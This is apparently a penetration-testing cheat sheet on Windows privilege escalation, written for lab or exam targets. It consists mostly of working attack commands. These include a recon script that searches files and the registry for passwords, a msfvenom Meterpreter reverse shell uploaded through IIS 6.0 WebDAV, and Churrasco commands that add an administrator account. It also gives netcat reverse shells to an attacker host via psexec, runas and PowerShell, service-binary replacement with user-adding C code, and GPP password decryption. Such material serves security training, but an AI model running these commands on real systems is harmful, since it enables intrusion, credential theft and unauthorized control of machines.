Windows Privilege Escalation resource  http://www.fuzzysecurity.com/tutorials/16.html

Metasploit Meterpreter Privilege Escalation Guide  https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:

    `whoami`

    `net user "%username%"`

Try the getsystem command using meterpreter - rarely works but is worth a try.
   `meterpreter > getsystem`

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).

          Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:
@echo --------- BASIC WINDOWS RECON ---------    > report.txt
timeout 1
net config Workstation    >> report.txt
timeout 1
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
timeout 1
hostname >> report.txt
timeout 1
net users >> report.txt
timeout 1
ipconfig /all >> report.txt
timeout 1
route print >> report.txt
timeout 1
arp -A >> report.txt
timeout 1
netstat -ano >> report.txt
timeout 1
netsh firewall show state >> report.txt
timeout 1
netsh firewall show config >> report.txt
timeout 1
schtasks /query /fo LIST /v >> report.txt
timeout 1
tasklist /SVC >> report.txt
timeout 1
net start >> report.txt
timeout 1
DRIVERQUERY >> report.txt
timeout 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
timeout 1
findstr /si password *.xml *.ini *.txt >> report.txt
timeout 1
reg query HKLM /f password /t REG_SZ /s >> report.txt
timeout 1
reg query HKCU /f password /t REG_SZ /s >> report.txt
timeout 1
dir "C:\"
timeout 1
dir "C:\Program Files\" >> report.txt
timeout 1
dir "C:\Program Files (x86)\"
timeout 1
dir "C:\Users\"
timeout 1
dir "C:\Users\Public\"
timeout 1
echo REPORT COMPLETE!

Windows Server 2003 and IIS 6.0 WEBDAV Exploiting  http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

cadavar http://$ip
dav:/> put aspshell.txt
Uploading aspshell.txt to `/aspshell.txt':
Progress: [=============================>] 100.0% of 38468 bytes succeeded.
dav:/> copy aspshell.txt aspshell3.asp;.txt
Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':    succeeded.
dav:/> exit

msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 1.2.3.4
msf exploit(handler) > set LPORT 80
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j

curl http://$ip/aspshell3.asp;.txt

[*] Started reverse TCP handler on 1.2.3.4:443
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 1.2.3.5
[*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

Compile Windows privledge escalation exploits using pyinstaller.py into an executable
Windows privledge escalation exploits are often written in Python. So, it is necessary to compile them using pyinstaller.py into an executable and upload them to the remote server.
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:

https://www.exploit-db.com/exploits/6705/

https://github.com/Re4son/Churrasco

c:\Inetpub>churrasco
churrasco
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"

c:\Inetpub>churrasco -d "net user /add <username> <password>"
c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

Windows MS11-080 - http://www.exploit-db.com/exploits/18176/
python pyinstaller.py --onefile ms11-080.py
mx11-080.exe -O XP

Powershell Exploits
You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.    Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

            MS16-032 https://www.exploit-db.com/exploits/39719/

powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"

Powershell Priv Escalation Tools
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

Windows Run As
Switching users in linux is trival with the `SU` command.    However, an equivalent command does not exist in Windows.    Here are 3 ways to run a command as a different user in Windows.

  Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"

PsExec v2.2 - Execute processes remotely
opyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
Enter the password for Test:
Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

        Next run this script using powershell.exe:
    `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`

Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.
icacls scsiaccess.exe

scsiaccess.exe
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
Everyone:(I)(F)

Compile a custom add user command in windows using C
       root@kali:~# cat useradd.c
            #include /* system, NULL, EXIT_FAILURE */
            int main ()
            {
            int i;
            i=system ("net localgroup administrators low /add");
            return 0;
            }

      `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

Group Policy Preferences (GPP)
        A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files

map the Domain controller SYSVOL share
            `net use z:\\dc01\SYSVOL`

Find the GPP file: Groups.xml
            `dir /s Groups.xml`

Review the contents for passwords
            `type Groups.xml`

Decrypt using GPP Decrypt
            `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`

Find and display the proof.txt or flag.txt - get the loot!
    `#meterpreter    >          run    post/windows/gather/win_privs`
    `cd\ & dir /b /s proof.txt`
    `type c:\pathto\proof.txt`

Other Useful links
Fuzzy Security - Windows Privilege Escalation
GDSSecurity - Windows Exploit Suggester
Xapax - Privilege Escalation
bhafsec - Windows Privilege Escalatio
